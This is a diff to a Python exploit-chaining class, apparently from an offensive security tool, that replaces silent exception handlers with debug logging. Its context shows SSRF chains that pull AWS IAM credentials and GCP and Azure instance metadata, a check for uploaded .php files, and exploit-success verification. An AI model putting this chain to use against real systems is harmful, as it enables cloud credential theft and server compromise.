@@ -2056,8 +2056,8 @@ class ChainExploitRunner:
                     self._build_inject_url(url, param, identity_url), timeout=6
                 )
                 identity = _json.loads(r3.text) if r3.status_code == 200 else {}
-            except Exception:
-                pass
+            except Exception as _e:
+                _logger.debug(f"[ChainExploitRunner] Cloud identity probe failed: {_e!r}")
 
             return {
                 "type": "SSRF→AWS IAM Credential Exfil",
@@ -2122,8 +2122,8 @@ class ChainExploitRunner:
                     timeout=6,
                 )
                 project_id = r3.text.strip() if r3.status_code == 200 else ""
-            except Exception:
-                pass
+            except Exception as _e:
+                _logger.debug(f"[ChainExploitRunner] GCP metadata probe failed: {_e!r}")
 
             _logger.info(f"[ChainExploitRunner] GCP metadata: SA={sa_email!r}")
             return {
@@ -2179,8 +2179,8 @@ class ChainExploitRunner:
                     compute = instance.get("compute", {})
                     sub_id = compute.get("subscriptionId", "")
                     resource_group = compute.get("resourceGroupName", "")
-            except Exception:
-                pass
+            except Exception as _e:
+                _logger.debug(f"[ChainExploitRunner] Azure IMDS probe failed: {_e!r}")
 
             _logger.info(f"[ChainExploitRunner] Azure IMDS: subscription={sub_id!r}")
             return {
@@ -2619,8 +2619,8 @@ class ChainExploitRunner:
                 val = data.get(key, "")
                 if val and (filename.split(".")[0] in val or ".php" in val):
                     return urljoin(upload_url, val)
-        except Exception:
-            pass
+        except Exception as _e:
+            _logger.debug(f"[ChainExploitRunner] Upload URL parse failed: {_e!r}")
 
         # Check HTML for file references
         base_name = filename.split(".")[0]
@@ -2737,8 +2737,8 @@ class ChainExploitRunner:
                 f in r.text.lower() for f in fail_indicators
             ):
                 return True
-        except Exception:
-            pass
+        except Exception as _e:
+            _logger.debug(f"[ChainExploitRunner] Exploit verify request failed: {_e!r}")
         return False
 
     def get_results(self) -> List[Dict[str, Any]]:
